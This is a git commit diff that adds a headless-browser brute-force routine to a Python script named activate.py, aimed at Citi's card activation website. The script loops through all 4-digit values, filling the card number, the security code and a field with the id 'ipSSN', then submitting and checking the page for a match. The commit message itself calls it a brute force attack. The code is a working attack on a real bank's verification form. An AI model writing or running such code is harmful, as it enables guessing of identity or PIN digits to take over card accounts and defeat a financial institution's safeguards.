e56958e15107a954744a16d2c8e22808cfe9ff1b
Christopher Dellomes <cjdellomes@gmail.com>
2020-08-29 14:33:20 -0700

    Implemented headless browser based brute force attack.

--- activate.py
+++ activate.py
@@ -1,10 +1,15 @@
 import requests
 import config
+import time
 from permute import permute
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 
+HOME_URL = 'https://www.cardactivation.citi.com'
 CONTINUE_URL = 'https://www.cardactivation.citi.com/Home/Continue1'
 POSSIBLE_PIN_DIGITS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
 PIN_DIGIT_COUNT = 4
+WAIT_DELAY = 5
 
 card_number = config.card_number
 security_code = config.security_code
@@ -32,5 +37,44 @@ def post_request_brute_force(possible_pins, card_number, security_code, url):
             return
 
 
-def selenium_brute_force(possible_pins, card_number, security_code, url):
-    return
+def selenium_brute_force(possible_pins, card_number, security_code, url, wait_delay):
+    for pin in possible_pins:
+        options = Options()
+        options.headless = True
+        driver = webdriver.Chrome(
+            executable_path='chromedriver.exe', options=options)
+        driver.get(url)
+
+        card_number_input = driver.find_element_by_id('ipCardNumber')
+        card_number_input.send_keys(card_number)
+
+        security_code_input = driver.find_element_by_id('ipSecurityCode')
+        security_code_input.send_keys(security_code)
+
+        pin_input = driver.find_element_by_id('ipSSN')
+        pin_input.send_keys(pin)
+
+        continue_btn = driver.find_element_by_id('continue1')
+        continue_btn.click()
+
+        time.sleep(wait_delay)
+
+        try:
+            temp_message = driver.find_element_by_id('tempMessage')
+            temp_message_text = driver.execute_script(
+                "return arguments[0].innerText;", temp_message)
+
+            if temp_message_text is None:
+                print('match ' + pin)
+                return
+
+            print(temp_message_text)
+            driver.close()
+
+        except Exception:
+            print('exception ' + pin)
+            return
+
+
+selenium_brute_force(possible_pins, card_number,
+                     security_code, HOME_URL, WAIT_DELAY)
